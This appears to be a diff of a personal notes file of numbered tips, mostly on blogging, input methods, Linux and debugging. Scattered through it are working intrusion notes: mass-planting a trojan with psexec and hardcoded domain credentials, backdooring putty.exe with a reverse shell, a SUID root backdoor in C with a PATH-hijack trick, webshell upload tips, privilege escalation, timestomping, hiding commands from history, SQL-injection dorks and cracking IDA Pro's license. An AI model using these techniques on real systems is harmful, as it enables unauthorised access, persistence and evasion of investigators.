+             https://www.91ri.org/tag/neiwang-hacker
+             http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
+             http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
+             http://cracer.com/?p=1247  拿下域控后批量种马:psexec.exe @pc.txt -u ABIMAQ&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator -p k78m90 -c c:&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;av&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;009.exe
+             http://drops.wooyun.org/tips/12021   拿下域控权限
+   快速找出dc:
+            dsquery server(best)
+            nslookup -type=SRV _ldap._tcp.baidu.com
+            netdom query fsmo
+            net group &quot;domain controllers&quot; /domain
+&lt;span class=&quot;p&quot;&gt;88.&lt;/span&gt;ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
+&lt;span class=&quot;p&quot;&gt;89.&lt;/span&gt;github pages+jekyll搭建个人博客:
+        https://www.zhihu.com/question/20223939
+        https://github.com/jacobtomlinson/carte-noire
+        http://www.tuicool.com/articles/RZbEV3
+        https://help.github.com/articles/configuring-jekyll/
+        https://help.github.com/articles/setting-up-your-github-pages-site-locally-with-jekyll/
+        http://jekyllrb.com/docs/github-pages/#project-page-url-structure
+        http://jekyllcn.com/
+        https://learnetto.com/blog/tutorial-how-to-host-your-websites-for-free-using-github-pages
+        http://pikipity.github.io/blog/kramdown-syntax-chinese-1.html   kramdown语法
+        http://pikipity.github.io/blog/kramdown-syntax-chinese-2.html   kramdown语法
+        http://platinhom.gitcafe.io/2015/11/06/Kramdown-note/           kramdown语法
+        https://ruby-china.org/topics/14005                             web中文字体应用指南(i use 文泉驿等宽正黑 )
+        http://platinhom.github.io/2015/06/06/Markdown-note/
+        http://xinghuacai.github.io
+        http://reyhan.org/2013/03/jekyll-archive-without-plugins.html   jekyll archive by year
+        myblog/posts-by-categories.html                                 jekyll archive by categories
+        http://www.ithome.com/html/it/195970.htm                        add music to my pages
+&lt;span class=&quot;p&quot;&gt;90.&lt;/span&gt;kali2.0使用pptp vpn时,需要在高级选项里勾选使用点到点加密,如果还不行则选择最安全的加密(128位),否则不能成功连接,另外,用不了l2tp vpn,不知系统哪里的问题
+&lt;span class=&quot;p&quot;&gt;91.&lt;/span&gt;https://ghostbin.com/  :-&amp;gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
+                                                             from:
+                                                             http://drops.wooyun.org/pentesting/15117
+&lt;span class=&quot;p&quot;&gt;92.&lt;/span&gt;kali2安装rime输入法:https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
+                       https://wu.nerd.moe/?p=1752
+                       /usr/bin/rime_dict_manager自带词库管理工具
+                            kali_local:/root/.config/fcitx/rime/wubi86.userdb.kct
+                            windows:%appdata%&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ime&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ubi86.userdb.kct
+                       http://www.jianshu.com/p/cffc0ea094a7
+                       https://github.com/rime/home/wiki/CustomizationGuide
+                       重新部署使配置生效:---&amp;gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx&lt;span class=&quot;sb&quot;&gt;
+
+                       pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;;nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
+                       emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
+                       新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
+                       eg.my default.custom.yaml file:
+                       ---------------------start------------------------
+                            patch:
+                                menu/page_size: 9
+                                schema_list:
+                                  - schema: luna_pinyin
+                                  - schema: luna_pinyin_fluency
+                                  - schema: luna_pinyin_simp
+                                  - schema: wubi_pinyin
+                                  - schema: wubi86
+                                  - schema: emoji
+                                ascii_composer:
+                                  good_old_caps_lock: true
+                                  switch_key:
+                                    Caps_Lock: clear
+                                    Control_L: noop
+                                    Control_R: commit_text
+                                    Eisu_toggle: clear
+                                    Shift_L: commit_code
+                                    Shift_R: inline_ascii
+                      --------------------end----------------------------
+    windows中rime词库文件位置:%APPDATA%\rime
+    深蓝词库转换工具:
+                    https://github.com/studyzy/imewlconverter
+                    http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html
+
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;93.&lt;/span&gt;windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;amp;form=MSHOME
+&lt;span class=&quot;p&quot;&gt;94.&lt;/span&gt;backdoor-factory用法:
+&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
+                             backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
+                             backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former &#39;show&#39; command) -H vps&#39;s ip -P 200
+&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;backdoor-factory in veil:--&amp;gt;veil--&amp;gt;list--&amp;gt;number of native/backdoor-factory--&amp;gt;options--&amp;gt;set the options
+&lt;span class=&quot;p&quot;&gt;95.&lt;/span&gt;aspx大马连接报错&quot;/&quot;解决方法:http://www.asp-muma.com/?post=97
+   my way defferent from uppon one:
+   create a new folder,create a web.config file with below content:
+   --------------------------content------------------------
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;system&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;customErrors&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Off&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;/system.web&amp;gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+   --------------------------end of content----------------
+   then upon a strong webshell to my new created folder,found no more error.
+&lt;span class=&quot;p&quot;&gt;96.&lt;/span&gt;百度云上传限制绕过:copy 1.rmvb /b + hunxiao.txt /a 1-hunxiao-txt.rmvb
+&lt;span class=&quot;p&quot;&gt;97.&lt;/span&gt;windows中ping google &amp;amp;&amp;amp; ping baidu ==&amp;gt;ping.bat:
+                                         cmd /k &quot;ping www.google.com.hk &amp;amp;&amp;amp; ping www.baidu.com&quot;
+   创建ping.bat文件的快捷方式,在快捷方式中添加快捷键.eg.ctrl+alt+p
+&lt;span class=&quot;p&quot;&gt;98.&lt;/span&gt;linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid.conf default_port:3128
+&lt;span class=&quot;p&quot;&gt;99.&lt;/span&gt;booklist:http://www.jianshu.com/p/67e294106919
+&lt;span class=&quot;p&quot;&gt;100.&lt;/span&gt;gdb:http://www.jianshu.com/p/f20b10ea9a61
+&lt;span class=&quot;p&quot;&gt;101.&lt;/span&gt;study links:
+    http://www.shiyanbar.com/questions/733
+    http://ch3rish.lofter.com/post/1d503b96_791362d
+&lt;span class=&quot;p&quot;&gt;102.&lt;/span&gt;linux中suid,sgid,sticky详解:http://crazyming.blog.51cto.com/1048571/467414
+    find / -type f -perm -4000 -ls &amp;gt; tmp.txt   function:find suid files
+        find / -type f -perm -4000 -ls | grep &quot;flag00&quot; &amp;gt; tmp.txt    function:find file has setuid=flag00
+    find / -type f -perm -2000 -ls &amp;gt; tmp.txt   function:find sgid files
+    find / -perm -2 -type f -print             function:find files can be writeable by everyone
+        echo &quot;/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh&quot; &amp;gt;&amp;gt; writeable_file_if_it_is_from_any_autorun_directory
+        /tmp/.sh -p(this command to get a euid=root shell)
+&lt;span class=&quot;p&quot;&gt;103.&lt;/span&gt;linux中好用的find命令:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print
+&lt;span class=&quot;p&quot;&gt;104.&lt;/span&gt;one linux backdoor shell can be like this:(file.c)
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdlib&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;unistd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdio&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    
+    int main(int argc, char &lt;span class=&quot;gs&quot;&gt;**argv, char **&lt;/span&gt;envp)
+    {
+    	gid_t gid;
+    	uid_t uid;
+    	gid = getegid();
+    	uid = geteuid();
+    
+    	setresgid(gid, gid, gid);
+    	setresuid(uid, uid, uid);
+    
+    	system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);
+    }&lt;span class=&quot;sb&quot;&gt;
+
+    to use this file as a root shell backdoor after got a root shell,
+    use root role execute:
+        gcc -o 1 file.c
+        mv 1 /bin/l2ping
+        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
+    use webshell role execute:
+        PATH=/tmp:$PATH
+        export PATH
+        echo $PATH(to check if /tmp is in $PATH)
+        ln -s /bin/sh /tmp/echo
+    then use webshell role to get a root privilege shell:
+        /bin/l2ping
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;105.&lt;/span&gt;linux中修改文件时间
+    同时修改文件的修改时间和访问时间
+    touch -d &quot;2010-05-31 08:10:30&quot; test.doc
+&lt;span class=&quot;p&quot;&gt;106.&lt;/span&gt;rime全角到半角解决方法:如果主机突然变成全角而无法变回半角,从任意地方中复制一个正常的半角字符串到主机中任意地方即可,不用重启
+&lt;span class=&quot;p&quot;&gt;107.&lt;/span&gt;ssh文件复制:eg.本机未登录前执行
+        scp level08@192.168.2.140:/home/level08/capture.pcap /1.pcap     (remote-&amp;gt;local)
+        scp /tmp.txt level08@192.168.2.140:/home/level08/                (local-&amp;gt;remote)
+&lt;span class=&quot;p&quot;&gt;108.&lt;/span&gt;echo &#39;ibase=16;410&#39; | bc 
+        16进制的410转换成默认10进制:out-&amp;gt;1040
+    echo &#39;ibase=16;obase=2;410&#39; | bc
+        16进制的410转换成2进制:out-&amp;gt;10000010000
+&lt;span class=&quot;p&quot;&gt;109.&lt;/span&gt;python中ord和int:
+    int(&#39;12&#39;)=12
+    int(&#39;b&#39;)=error(int的参数只能是&#39;num&#39;类型)
+    ord(&#39;b&#39;)=98
+    ord(&#39;a&#39;)=97
+    ord(&#39;0&#39;)=48
+    ord(&#39;ascii&#39;)=ascii这一个字符对应的十进制整数(ascii只能是a character,not string)
+&lt;span class=&quot;p&quot;&gt;110.&lt;/span&gt;书单
+        http://www.heysec.org/archives/257
+        https://www.zhihu.com/question/24152689
+        http://m.blog.csdn.net/article/details?id=45482849
+&lt;span class=&quot;p&quot;&gt;111.&lt;/span&gt;linux上ssh无法以root用户登录解决方法:
+    vi /etc/ssh/sshd_config (attention!,here is not /etc/ssh/ssh_config)
+    /PermitRootLogin&lt;span class=&quot;nt&quot;&gt;&amp;lt;Enter&amp;gt;&lt;/span&gt;
+    change to:
+        PermitRootLogin yes
+&lt;span class=&quot;p&quot;&gt;112.&lt;/span&gt;gcc编译so文件:
+        gcc -shared -fPIC myfile.c -o myfile.socc
+&lt;span class=&quot;p&quot;&gt;113.&lt;/span&gt;wordpress 渗透工具
+&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;wpscan
+&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;http://www.getwpxf.com/  seems better
+&lt;span class=&quot;p&quot;&gt;114.&lt;/span&gt;linux中c代码中多个参数代码编写参考规范:http://blackndoor.com/nebula-level18/
+&lt;span class=&quot;p&quot;&gt;115.&lt;/span&gt;一个十六进制位是4bits,0x12345678是32bits,相当于一个32位系统下的栈单元
+    一个汉字是2个字符4个字节32位,4 bytes,32 bits
+    一个DWORD则是4个字符8个字节64位,8 bytes,64 bits
+&lt;span class=&quot;p&quot;&gt;116.&lt;/span&gt;linux安装程序
+    cd program
+    ./configure
+    make
+    sudo make install
+&lt;span class=&quot;p&quot;&gt;117.&lt;/span&gt;linux提权时,编译exploit.c文件时必须在对方系统中编译,或者与对方系统一样的系统中编译,否则本地编译出exploit文件后上传到对方机器运行时会出现can not execute binary file的错误
+&lt;span class=&quot;p&quot;&gt;118.&lt;/span&gt;访问目录时,404不代表文件夹一定不存在,尤其是那些不标准显示的404,有可能是webapp或waf故意这样显示的,但是404显示目录下的文件还是可以正常访问的
+&lt;span class=&quot;p&quot;&gt;119.&lt;/span&gt;c_++头:
+        using namespace std;
+        #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;120.&lt;/span&gt;ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,然后将系统时间改成1年以前下的key文件,然后将系统时间改成1年以前
+&lt;span class=&quot;p&quot;&gt;121.&lt;/span&gt;ROP就是所谓的Return Orientated Programming,早期也叫ret2libc.
+&lt;span class=&quot;p&quot;&gt;122.&lt;/span&gt;html中的图标    http://fontawesome.io/icons/
+&lt;span class=&quot;p&quot;&gt;123.&lt;/span&gt;fckeditor设置:hhttp://www.itpa.hk/ttp://www.jb51.net/article/17965.htm
+&lt;span class=&quot;p&quot;&gt;124.&lt;/span&gt;html转pdf:
+    wkhtmltopdf www.myhomepage.com myhomepage.pdf
+    在线pdf编辑 http://www.pdfescape.com/
+    本地pdf快速转换:chrome浏览器(全选或部分选择后)右键可打印成pdf
+&lt;span class=&quot;p&quot;&gt;125.&lt;/span&gt;printf(&quot;%x&quot;):第一个栈里的值
+    printf(&quot;%3x&quot;):第一个栈里的值,用3个字节长度表示
+    printf(&quot;%3&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;x&quot;):第三个栈里的值(这一条适用于绝大多数的&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;nix的系统,win下不支持则用printf(&quot;%x,%x,%x&quot;)来达到同样的目的)
+    宽度格式符(%3)中的%和3是不分开的,如果%3后面加了&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;(直接参数访问)则表示为打印第3个栈里的值
+&lt;span class=&quot;p&quot;&gt;126.&lt;/span&gt;visual studio快速编译一个c文件
+    运行C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files (x86)&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft Visual Studio 14.0&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;ommon7&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;ools&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;sDevCmd.bat
+    然后运行cl md.c
+    或者打开tools里面的开发人员提示符,然后再cl md.c
+&lt;span class=&quot;p&quot;&gt;127.&lt;/span&gt;安装sulley过程中首先选用管理员身份安装,如果失败,再手动安装,安装要求python2.4,如果机器上已经安装了python的其他版本,需要人工将python2.4加入到环境变量中,再去sulley framework的安装目录下中的install_files中将ctypes和pcapy用管理员身份安装
+&lt;span class=&quot;p&quot;&gt;128.&lt;/span&gt;sulley中的process_monitor.py中用的是os.system来启动崩溃的程序继续fuzz,这样是阻塞方式,不可以,可改成os.startfile或subprocess中的popen
+    os.startfile(相当于双击操作,eg. os.startfile(&quot;1.txt&quot;)):   http://blog.sina.com.cn/s/blog_4b5039210100froh.html
+&lt;span class=&quot;p&quot;&gt;129.&lt;/span&gt;my_sulley学习资料
+    http://pan.baidu.com/s/1c1Y6kVY
+&lt;span class=&quot;p&quot;&gt;130.&lt;/span&gt;linux中批量替换目录文件中的字符串:
+    sed -i &quot;s/xinghuacai/3xp10it/g&quot; &lt;span class=&quot;sb&quot;&gt;`grep xinghuacai -rl .`&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;131.&lt;/span&gt;github在push时免输入用户名密码:
+    http://www.cnblogs.com/ballwql/p/3462104.html
+&lt;span class=&quot;p&quot;&gt;132.&lt;/span&gt;mysql中表名为关键字的处理方法,&lt;span class=&quot;sb&quot;&gt;`table_name`&lt;/span&gt;
+    http://www.cnblogs.com/puzi0315/archive/2012/08/27/2658169.html
+&lt;span class=&quot;p&quot;&gt;133.&lt;/span&gt;windows截图神器Snipaste
+    http://zh.snipaste.com/
+&lt;span class=&quot;p&quot;&gt;134.&lt;/span&gt;windows下rime修改备选词个数:打开default.yaml,修改对应数字
+&lt;span class=&quot;p&quot;&gt;135.&lt;/span&gt;ranger:linux terminal file manage god software
+&lt;span class=&quot;p&quot;&gt;136.&lt;/span&gt;github pages生成的博客本地有语法高亮而正常http://3xp10it.github.io没有语法高亮的原因:
+    由于github将博客升级成https://3xp10it.github.io,而本地浏览器访问https://3xp10it.github.io时,出于安全性考虑,禁用了js
+    本地生成的博客为http://127.0.0.1:4000,没有https
+    解决办法:https://help.github.com/articles/securing-your-github-pages-site-with-https/
+        将博客文件夹中的https变成http
+&lt;span class=&quot;p&quot;&gt;137.&lt;/span&gt;终端字符串生成图像工具
+    banner
+    figlet
+    toilet
+    http://blog.chinaunix.net/uid-10540984-id-2881092.html
+    https://xin053.github.io/2016/07/06/pyfiglet%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/
+&lt;span class=&quot;p&quot;&gt;138.&lt;/span&gt;bind shift+e to firefox&#39;s perference shortcut key bind
+&lt;span class=&quot;p&quot;&gt;139.&lt;/span&gt;制作pypi的python模块(eg.exp10it.py)时,在本地如果exp10it.py中有中文,在一个正常的py文件中如果有一句from exp10it import &lt;span class=&quot;ge&quot;&gt;*,如果这个正常的py文件中由于这句导入了相同文件夹目录下的exp10it.py模块,会由于其中的中文而产生错误,可以上传到pypi后由pip install安装exp10it模块后使用from exp10it import *&lt;/span&gt;,同时需要删除同目录下的exp10it.py文件,否则from exp10it import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;依然会优先从同目录下找exp10it.py模块
+&lt;span class=&quot;p&quot;&gt;140.&lt;/span&gt;sqlmap得出经验,一般跑出只有盲注的uri注入点,一般都是由于waf拦截了普通的union注入语句,只要想办法绕过waf就可以用union来快速注入了,否则只能用sqlmap跑出来的盲注payload进行慢慢的注入,且有可能不能注入出所有数据,依然被waf拦截
+&lt;span class=&quot;p&quot;&gt;151.&lt;/span&gt;python模块中声明编码为utf-8的注释代码不用放在前两行,如果出错,说明代码其他地方有误
+&lt;span class=&quot;p&quot;&gt;152.&lt;/span&gt;compiz和unity的问题:
+    dconf reset -f /org/compiz
+    setsid unity
+    unity --reset-icons&lt;span class=&quot;sb&quot;&gt;
+
+    another:
+    cd 
+    rm -rf .config/apps/compiz*
+    rm -rf .cache/compizconfig-1
+    rm -rf .config/compiz-1
+    rm -rf .compiz
+    
+    本机出现窗口没有&quot;关闭,最小化&quot;等解决方法:
+        打开compiz设置在窗口管理处勾选&quot;放置窗口&quot;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;153.&lt;/span&gt;linux清理:
+    1&amp;gt;apt-get autoremove
+    2&amp;gt;apt-get autoclean
+    3&amp;gt;apt-get clean
+    4&amp;gt;dpkg -l |grep ^rc|awk &#39;{print $2}&#39; |sudo xargs dpkg -P(一键删除残余配置文件)
+&lt;span class=&quot;p&quot;&gt;154.&lt;/span&gt;ubuntu audio:http://forum.ubuntu.org.cn/viewtopic.php?t=324619
+&lt;span class=&quot;p&quot;&gt;155.&lt;/span&gt;ubuntu 16.04 super+d切换到桌面的方法,在系统的键盘设置中取消导航中的隐藏所有窗口的super+d的快捷键,打开compizconfig settins manager,搜索unity,找到显示桌面的快捷键设置处,设置为super+d
+&lt;span class=&quot;p&quot;&gt;156.&lt;/span&gt;pip install exp10it -U出现无法立刻升级处理办法:pip install exp10it=(local_latest_version)
+&lt;span class=&quot;p&quot;&gt;157.&lt;/span&gt;grep多行匹配:(eg.匹配exp10it.py中的api)
+    pcregrep -M &#39;def .&lt;span class=&quot;ge&quot;&gt;*(.*&lt;/span&gt;):&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;(.&lt;span class=&quot;ge&quot;&gt;*#.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;){1,10}&#39;
+&lt;span class=&quot;p&quot;&gt;158.&lt;/span&gt;linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法:
+    ps -aux | grep &quot;vmware&quot;
+    kill pid_of_error_machine
+&lt;span class=&quot;p&quot;&gt;159.&lt;/span&gt;google dock:
+    http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
+    inurl:&quot;php&quot;|&quot;php page=&quot;|&quot;php id=&quot;|&quot;php tid=&quot;|&quot;php pid=&quot;|&quot;php cid=&quot;|&quot;php path=&quot;|&quot;php cmd=&quot;|&quot;php file=&quot;|&quot;php cartId=&quot;|&quot;php bookid=&quot;|&quot;php num=&quot;|&quot;php idProduct=&quot;|&quot;php ProdId=&quot;|&quot;php idCategory=&quot;|&quot;php intProdID=&quot;|&quot;cfm storeid=&quot;|&quot;php catid=&quot;|&quot;php cart_id=&quot;|&quot;php order_id=&quot;|&quot;php catalogid=&quot;|&quot;php item=&quot;|&quot;php title=&quot;|&quot;php CategoryID=&quot;|&quot;php action=&quot;|&quot;php newsID=&quot;|&quot;php newsid=&quot;|&quot;php product_id=&quot;|&quot;php cat=&quot;|&quot;php parent_id=&quot;|&quot;php view=&quot;|&quot;php itemid=&quot; site:www.facebook.com
+    site:xxx.xxx.xxx inurl:union select
+    site:xxx.xxx.xxx intext:warning|error|syntax|incorrect|unexpected|occurred|command|execute
+&lt;span class=&quot;p&quot;&gt;160.&lt;/span&gt;my own github&#39;s md file:
+    每行111个字节长度,但是写md时并不用在vim中设置111个字节长度后自动换行,因为md文件会在应该换行的时候自动换行,只要将一段的内容写到md文件中的一行中即可
+&lt;span class=&quot;p&quot;&gt;161.&lt;/span&gt;echo $HISTCONTROL,如果结果为ignoreboth,执行命令时先加空格再输入命令则history不会记录
+&lt;span class=&quot;p&quot;&gt;162.&lt;/span&gt;github-pages 使用多说
+    http://www.ituring.com.cn/article/114888
+&lt;span class=&quot;p&quot;&gt;163.&lt;/span&gt;windbg调试命令详解:
+    http://www.yiiyee.cn/Blog/windbg/
+    http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx
+    db esi:查看esi地址中的内容
+        db 400000:查看0x400000处的内容,db按字节大小查看,dd按DWORD类型查看
+    !address edi:显示edi地址处的内存状态,信息
+    lmm mso v:匹配mso模块,并显示详细信息
+    bp eax:在eax处下断点,支持第几次经过后中断,支持中断后执行命令
+    g:让被调试的程序继续运行(f5)
+        gh:把异常标识为已处理并断续执行程序
+        go:对异常不进行任何处理并继续执行程序
+    kb:显示传递给堆栈回溯中的每个函数的前三个参数
+        kp:显示传递给堆栈回溯中的每个函数的所有参数
+    ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
+        uf test!main:反汇编test!main函数
+    p:单步步入step into(f11)
+    t:单步步过step over(f10)
+    ? ebp-edi:显示表达式ebp-edi的值
+        ?? expression:显示c++表达式的值
+    .cls:清屏
+&lt;span class=&quot;p&quot;&gt;164.&lt;/span&gt;firefox好用的一个翻译附加组件:
+    S3.Google Translator
+&lt;span class=&quot;p&quot;&gt;165.&lt;/span&gt;firefox的vimperator插件使用:
+    http://wangbixi.com/x2923/comment-page-1/
+    http://pchu.blogbus.com/
+    http://luoxiqofy.blogbus.com
+    http://www.cnblogs.com/flywuya/archive/2010/12/29/1920485.html
+&lt;span class=&quot;p&quot;&gt;166.&lt;/span&gt;恶意文档分析技巧及工具快速参考
+    http://wenku.baidu.com/link?url=m7GL0Q9W8Pei47frvTquIe9pAgKejBtPesAwZFiClOAEHK23ZF5xRxqA8eowV6e1HiKscwjxIWNOFRC3ep78yFurtSN5L0ZjQ0gV4uu72Lq
+&lt;span class=&quot;p&quot;&gt;167.&lt;/span&gt;ubuntu安装java
+    http://www.linuxdiyf.com/linux/21071.html
+&lt;span class=&quot;p&quot;&gt;168.&lt;/span&gt;文件下载或文件读取漏洞思路:
+    1&amp;gt;读数据库连接文件
+    2&amp;gt;尝试连接数据库
+        a&amp;gt;是否支持数据库外连
+        b&amp;gt;是否有phpmyadmin(扫目录)
+            select ... into dumpfile ...
+                如果不知道写shell路径,可从phpmyadmin中找找数据库中存在的路径,实战中找到过phpmyadmin的web页面的路径
+            如果不能写文件则通过查看数据库中的管理员用户名密码进后台上传shell
+            或者用数据库中的其他密码尝试连接ftp
+            或者如果数据库中有editor的setting,修改为可以上传php
+    3&amp;gt;尝试读取到ftp配置文件,尝试用数据库用户名密码连接ftp
+    4&amp;gt;代码审计
+&lt;span class=&quot;p&quot;&gt;169.&lt;/span&gt;www.gnu.org上可以下载linux系统自带的工具,eg.find工具
+&lt;span class=&quot;p&quot;&gt;170.&lt;/span&gt;discuz漏洞扫描工具
+    dzscan
+    https://github.com/code-scan/dzscan
+&lt;span class=&quot;p&quot;&gt;171.&lt;/span&gt;windbg中找不到symbol路径解决方法:
+    .sympath srv&lt;span class=&quot;ge&quot;&gt;*c:symbols*&lt;/span&gt;http://msdl.microsoft.com/download/symbols
+    .reload /f
+&lt;span class=&quot;p&quot;&gt;172.&lt;/span&gt;《深入理解计算机系统》读书参照
+    http://wdxtub.com/2016/04/16/thin-csapp-0/
+    http://www.voidcn.com/blog/zym0017d/article/p-540879.html
+&lt;span class=&quot;p&quot;&gt;173.&lt;/span&gt;实用的搜索引擎
+    http://kaopu.so/
+&lt;span class=&quot;p&quot;&gt;174.&lt;/span&gt;awk实用指南
+    http://awk.readthedocs.io/en/latest/chapter-one.html
+&lt;span class=&quot;p&quot;&gt;175.&lt;/span&gt;ssrf相关
+    http://evilcos.me/?p=221
+&lt;span class=&quot;p&quot;&gt;176.&lt;/span&gt;find查找最近的文件:
+    find / -amin -10 # 查找在系统中最后10分钟访问的文件
+    find / -atime -2 # 查找在系统中最后48小时访问的文件
+    
+    find / -mmin -5 # 查找在系统中最后5分钟里修改过的文件
+    find / -mtime -1 #查找在系统中最后24小时里修改过的文件76
+&lt;span class=&quot;p&quot;&gt;177.&lt;/span&gt;php数组键值对
+    http://www.cnblogs.com/coderchuanyu/p/3904711.html
+&lt;span class=&quot;p&quot;&gt;178.&lt;/span&gt;快速查看webshell大马是否含有后门:
+    firebug|网络,如果看到访问大马时还有其他可疑访问uri,说明有后门
+&lt;span class=&quot;p&quot;&gt;179.&lt;/span&gt;pyc文件相当于pyhton文件的缓存,如果import了某个模块后在目录下生成了pyc文件,就算这个刚才被import的py模块被删除了,但是由于pyc文件还存在,仍然可以import 该模块
+&lt;span class=&quot;p&quot;&gt;180.&lt;/span&gt;python查看模块中有哪些函数(dir()用法)
+    http://www.iplaypython.com/jichu/dir.html
+&lt;span class=&quot;p&quot;&gt;181.&lt;/span&gt;python多线程中使用multiprocessing.pool参数为多个的使用方法
+    http://stackoverflow.com/questions/4474940/unsupported-operand-types-exception-with-threappool-map-but-not-map&lt;span class=&quot;sb&quot;&gt;
+
+    from multiprocessing.dummy import Pool as ThreadPool
+    pool=ThreadPool(20)
+    使用map和map_async:
+        pool.map() vs pool.map_async
+        map是阻塞的,要等到map里面的列表中的所有
+        相应文档:
+            https://docs.python.org/2/library/multiprocessing.html(英文)
+            http://python.usyiyi.cn/translate/python_278/library/index.html(中文)
+            中文不详尽,英文中说到multiprocessing.dummy就是multiprocessing的复制版本,只不过multiprocessing.dummy作用于线程
+            &quot;multiprocessing.dummy replicates the API of multiprocessing but is no more than a wrapper around the threading module.&quot;
+            所以参考multiprocessing的api来使用操作线程池即可
+
+            https://mugglecoding.gitbooks.io/qa/content/poolzen_yao_shi_yong.html
+
+            pool.close()
+                防止任何更多的任务(其他没有安排过的任务,map过的任务不属于这个范围)被提交到线程池中.一旦所有的任务已经完成了工作线程将退出.
+            pool.terminate()
